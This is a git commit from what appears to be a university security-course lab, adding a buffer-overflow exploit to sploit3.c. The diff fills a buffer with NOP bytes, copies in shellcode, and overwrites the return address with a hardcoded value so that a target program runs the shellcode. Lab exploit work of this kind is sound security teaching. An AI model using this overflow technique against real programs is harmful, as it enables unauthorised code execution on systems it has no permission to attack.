e84dba2fd30bd48818d68160fae1a0144c2169a4
Baiwu  Zhang <zhangba8@p57.ecf.utoronto.ca>
2018-09-28 17:28:35 -0400

    Finished Lab1 Part3.

--- Lab1/sploits/sploit3.c
+++ Lab1/sploits/sploit3.c
@@ -12,8 +12,21 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 
+	int BUFSIZE = 73;
+	char attackBuffer[BUFSIZE];
+	int shellcode_length = 45;
+	int i;
+	for (i = 0; i < BUFSIZE; i++){
+		attackBuffer[i] = 0x90;	
+	}
+	for (i = 0; i < 45; i ++){
+		attackBuffer[ i] = shellcode[i];
+	}
+	*(int *) & attackBuffer[68] = 0x3050fe14;
+	attackBuffer[72] = NULL;
+
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = attackBuffer;
 	args[2] = NULL;
 
 	env[0] = NULL;
